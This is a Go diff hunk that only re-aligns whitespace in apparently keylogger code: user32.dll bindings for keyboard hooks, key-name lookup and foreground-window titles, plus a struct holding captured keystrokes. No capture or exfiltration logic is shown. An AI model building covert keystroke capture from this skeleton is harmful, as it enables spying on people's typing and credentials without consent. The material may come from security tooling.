@@ -45,26 +45,26 @@ type MSG struct {
 var (
 	user32KL = windows.NewLazySystemDLL("user32.dll")
 
-	procSetWindowsHookExW    = user32KL.NewProc("SetWindowsHookExW")
-	procUnhookWindowsHookEx  = user32KL.NewProc("UnhookWindowsHookEx")
-	procCallNextHookEx       = user32KL.NewProc("CallNextHookEx")
-	procGetMessageW          = user32KL.NewProc("GetMessageW")
-	procGetKeyNameTextW      = user32KL.NewProc("GetKeyNameTextW")
-	procGetForegroundWindow  = user32KL.NewProc("GetForegroundWindow")
-	procGetWindowTextW       = user32KL.NewProc("GetWindowTextW")
-	procPostThreadMessageW   = user32KL.NewProc("PostThreadMessageW")
+	procSetWindowsHookExW   = user32KL.NewProc("SetWindowsHookExW")
+	procUnhookWindowsHookEx = user32KL.NewProc("UnhookWindowsHookEx")
+	procCallNextHookEx      = user32KL.NewProc("CallNextHookEx")
+	procGetMessageW         = user32KL.NewProc("GetMessageW")
+	procGetKeyNameTextW     = user32KL.NewProc("GetKeyNameTextW")
+	procGetForegroundWindow = user32KL.NewProc("GetForegroundWindow")
+	procGetWindowTextW      = user32KL.NewProc("GetWindowTextW")
+	procPostThreadMessageW  = user32KL.NewProc("PostThreadMessageW")
 )
 
 // keylogState holds the global keylogger state
 type keylogState struct {
-	mu          sync.Mutex
-	running     bool
-	hookHandle  uintptr
-	buffer      strings.Builder
-	lastWindow  string
-	threadID    uint32
-	startTime   time.Time
-	keyCount    int
+	mu         sync.Mutex
+	running    bool
+	hookHandle uintptr
+	buffer     strings.Builder
+	lastWindow string
+	threadID   uint32
+	startTime  time.Time
+	keyCount   int
 }
 
 var kl = &keylogState{}
